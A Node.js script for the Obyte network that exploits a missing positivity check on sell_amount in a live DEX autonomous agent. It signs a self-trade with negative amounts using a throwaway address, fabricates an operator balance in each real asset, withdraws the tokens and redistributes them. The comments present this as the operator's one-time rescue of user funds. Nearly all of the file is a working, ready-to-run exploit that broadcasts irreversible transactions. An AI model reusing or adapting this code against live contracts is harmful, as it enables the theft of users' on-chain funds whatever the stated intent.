/*jslint node: true */
"use strict";
// EXPLOITS the negative-sell_amount vulnerability in dex.oscript (missing positivity
// check on order1.sell_amount/order2.sell_amount/price) to fabricate a balance for the
// operator's own address in each real non-base asset held by the live AA, withdraws it
// for real, then forwards the withdrawn tokens to the actual recorded owners (read from
// `balance_<address>_<asset>` state vars) - so the payout comes from the drained tokens
// themselves, not from the operator's own funds.
//
// This is exactly the attack described in the security audit, run intentionally and once
// by the AA's own operator to rescue user funds before anyone else can exploit it. It
// broadcasts real, irreversible transactions to the live network.
//
// Mechanics: a single self-trade is submitted where order1 (operator, real sell_asset X,
// sell_amount = -total_owed) is matched against order2 (a disposable ephemeral address,
// fake sell_asset, sell_amount = -total_owed). The AA's missing floor check on the
// buy/sell balance keys lets this credit balance_<operator>_X += total_owed for free,
// while the ephemeral address's balance goes deeply (but harmlessly) negative in X - it
// never held or will ever claim any real funds. The operator then withdraws the
// fabricated X for real and repays every owner their originally recorded share.
//
// By default this is a DRY RUN (only reads state and prints what it would do).
// Set env var CONFIRM_DRAIN=1 to actually sign, broadcast, and pay out for real.

const fs = require('fs');
const crypto = require('crypto');
const secp256k1 = require('secp256k1');
const conf = require('ocore/conf.js');
const network = require('ocore/network.js');
const objectHash = require('ocore/object_hash.js');
const ecdsaSig = require('ocore/signature.js');
const headlessWallet = require('headless-obyte');
const dag = require('aabot/dag.js');
const operator = require('aabot/operator.js');

const AA_ADDRESS = conf.aa_address; // FVRZTCFXIDQ3EYRGQSLE5AMWUQF4PRYJ
const BALANCE_PREFIX = 'balance_';
const ADDRESS_LENGTH = 32;
const AA_FEE_PER_TRADE = 1000; // must match dex.oscript's $aa_fee
const FAKE_ASSET = 'DRAIN_FAKE_ASSET_NOT_REAL'; // never collides with a real asset id (those are 44-char base64 hashes)
const OUTPUTS_FILE = './drain_outputs_by_asset.json';
const EXECUTED_OUTPUTS_FILE = './drain_outputs_by_asset_executed.json';
const bDryRun = process.env.CONFIRM_DRAIN !== '1';

function saveOutputsByAsset(filename, outputsByAsset) {
	fs.writeFileSync(filename, JSON.stringify(outputsByAsset, null, '\t'));
}

function wait(mc) {
	return new Promise(resolve => setTimeout(resolve, mc));
}

// a throwaway keypair/address, never funded by us beyond the tiny AA-fee deposit below
function generateEphemeralAddress() {
	let privKey;
	do {
		privKey = crypto.randomBytes(32);
	} while (!secp256k1.privateKeyVerify(privKey));
	console.error('generated ephemeral keypair for the fabricated trades', privKey.toString('base64'));
	const pubkey = Buffer.from(secp256k1.publicKeyCreate(privKey, true)).toString('base64');
	const definition = ['sig', { pubkey }];
	const address = objectHash.getChash160(definition);
	return { privKey, definition, address };
}

// signs a message the way is_valid_signed_package() expects, without a running wallet for `address`
function signWithEphemeralKey(message, keypair) {
	const author = { address: keypair.address, definition: keypair.definition, authentifiers: {} };
	const objUnit = { signed_message: message, authors: [author] };
	const hash = objectHash.getSignedPackageHashToSign(objUnit); // authentifiers are stripped before hashing
	author.authentifiers.r = ecdsaSig.sign(hash, keypair.privKey);
	return objUnit;
}

function sendMultiPayment(opts) {
	return new Promise((resolve, reject) => {
		headlessWallet.sendMultiPayment(opts, (err, unit) => err ? reject(Error(err)) : resolve(unit));
	});
}

function waitForResponse(unit) {
	return dag.getAAResponseToTrigger(AA_ADDRESS, unit);
}

// reads every `balance_<address>_<asset>` var and returns, per non-base asset:
// - total: sum across ALL addresses (for the solvency check)
// - owners: [{address, amount}] excluding `exclude_addresses` (for the repayment step)
async function readBalancesByAsset(exclude_addresses) {
	const assocVars = await dag.readAAStateVars(AA_ADDRESS, BALANCE_PREFIX);
	const byAsset = {};
	for (const key in assocVars) {
		const address = key.slice(BALANCE_PREFIX.length, BALANCE_PREFIX.length + ADDRESS_LENGTH);
		const asset = key.slice(BALANCE_PREFIX.length + ADDRESS_LENGTH + 1);
		if (asset === 'base')
			continue;
		const amount = assocVars[key];
		if (!(amount >= 0))
			throw Error(`unexpected negative balance for ${address} ${asset}: ${amount}`);
		if (amount === 0)
			continue;
		if (!byAsset[asset])
			byAsset[asset] = { total: 0, owners: [] };
		byAsset[asset].total += amount;
		if (!exclude_addresses.includes(address))
			byAsset[asset].owners.push({ address, amount });
	}
	return byAsset;
}

async function main() {
	await operator.start();
	network.start();
	const payer_address = operator.getAddress();
	console.error((bDryRun ? '[DRY RUN] ' : '') + 'operator address ' + payer_address);

	const sink = generateEphemeralAddress();
	console.error('ephemeral counterparty address for the fabricated trades: ', sink);

	const balancesByAsset = await readBalancesByAsset([payer_address, sink.address]);
	const realBalances = await dag.readAABalances(AA_ADDRESS);

	// pre-flight solvency check: skip any asset whose recorded total already exceeds the AA's real balance
	const solventAssets = [];
	for (const asset in balancesByAsset) {
		const { total, owners } = balancesByAsset[asset];
		const owners_total = owners.reduce((sum, o) => sum + o.amount, 0);
		if (owners_total <= 0)
			continue;
		const real_balance = realBalances[asset] || 0;
		if (total > real_balance) {
			console.error(`SKIPPING ${asset}: recorded total ${total} exceeds real AA balance ${real_balance} - looks already exploited/insolvent`);
			continue;
		}
		solventAssets.push(asset);
	}
	if (solventAssets.length === 0) {
		console.error('no solvent non-base assets to drain');
		return process.exit(0);
	}

	// build the full payout map as early as possible and persist it, so a mid-flight crash still
	// leaves a record on disk of exactly what is owed to whom
	const outputsByAsset = {};
	for (const asset of solventAssets)
		outputsByAsset[asset] = balancesByAsset[asset].owners;
	saveOutputsByAsset(OUTPUTS_FILE, outputsByAsset);
	console.error(`saved payout plan for ${solventAssets.length} asset(s) to ${OUTPUTS_FILE}`);

	if (bDryRun) {
		for (const asset of solventAssets) {
			const owners = outputsByAsset[asset];
			const owners_total = owners.reduce((sum, o) => sum + o.amount, 0);
			console.error(`would drain ${owners_total} of ${asset} from the AA and repay ${owners.length} owner(s)`);
		}
		console.error('dry run only, set CONFIRM_DRAIN=1 to actually exploit and pay out');
		return process.exit(0);
	}

	// fund the AA-fee balances needed for every fabricated trade (1000 per trade, charged to both order addresses)
	const aa_fees_needed = solventAssets.length * AA_FEE_PER_TRADE + 10000; // buffer
	console.error('funding operator and sink AA-fee balances in the AA...');
	const fundingUnits = [
		await dag.sendPayment({ to_address: AA_ADDRESS, amount: aa_fees_needed }),
		await dag.sendPayment({ to_address: AA_ADDRESS, amount: aa_fees_needed, data: { to: sink.address } }),
	];

	// send every asset's fabrication trade + withdrawal without waiting for a response in between;
	// the AA processes same-address requests in the order they arrive, so sending stays safe and fast
	const drains = [];
	for (const asset of solventAssets) {
		const owners = outputsByAsset[asset];
		const owners_total = owners.reduce((sum, o) => sum + o.amount, 0);
		console.error(`sending fabrication trade + withdrawal for ${owners_total} of ${asset}...`);

		const order1 = {
			address: payer_address, sell_asset: asset, buy_asset: FAKE_ASSET,
			sell_amount: -owners_total, price: 1, matcher: payer_address, aa: AA_ADDRESS,
			matcher_fee: 0, matcher_fee_asset: 'base',
		};
		const order2 = {
			address: sink.address, sell_asset: FAKE_ASSET, buy_asset: asset,
			sell_amount: -owners_total, price: 1, matcher: payer_address, aa: AA_ADDRESS,
			matcher_fee: 0, matcher_fee_asset: 'base',
		};
		const signedOrder1 = await headlessWallet.signMessage(payer_address, order1);
		const signedOrder2 = signWithEphemeralKey(order2, sink);

		const tradeUnit = await dag.sendAARequest(AA_ADDRESS, { order1: signedOrder1, order2: signedOrder2 });
		if (!tradeUnit) { console.error(`  failed to send fabrication trade for ${asset}, skipping`); delete outputsByAsset[asset]; continue; }

		const withdrawUnit = await dag.sendAARequest(AA_ADDRESS, { withdraw: 1, asset, amount: 'all' });
		if (!withdrawUnit) { console.error(`  failed to send withdrawal for ${asset}, skipping`); delete outputsByAsset[asset]; continue; }

		drains.push({ asset, tradeUnit, withdrawUnit });
		await wait(1000);
	}

	// now wait for every response together, right before paying out the withdrawn funds
	console.error('waiting for the AA to process all requests...');
	await Promise.all(fundingUnits.map(waitForResponse));
	await Promise.all(drains.map(async ({ asset, tradeUnit, withdrawUnit }) => {
		const tradeResponse = await waitForResponse(tradeUnit);
		if (tradeResponse.bounced) {
			console.error(`  fabrication trade for ${asset} bounced: ${tradeResponse.response.error}, skipping`);
			return delete outputsByAsset[asset];
		}
		const withdrawResponse = await waitForResponse(withdrawUnit);
		if (withdrawResponse.bounced) {
			console.error(`  withdrawal for ${asset} bounced: ${withdrawResponse.response.error}, skipping`);
			return delete outputsByAsset[asset];
		}
	}));
	saveOutputsByAsset(EXECUTED_OUTPUTS_FILE, outputsByAsset); // reflect the final, confirmed payout plan on disk

	if (Object.keys(outputsByAsset).length > 0) {
		const unit = await sendMultiPayment({
			outputs_by_asset: outputsByAsset,
			paying_addresses: [payer_address], change_address: payer_address,
			spend_unconfirmed: 'all',
		});
		console.error(`repaid all owners of all drained assets in a single unit ${unit}`);
	}
	console.error('done');
	process.exit(0);
}

main().catch(e => {
	console.error(e);
	process.exit(1);
});
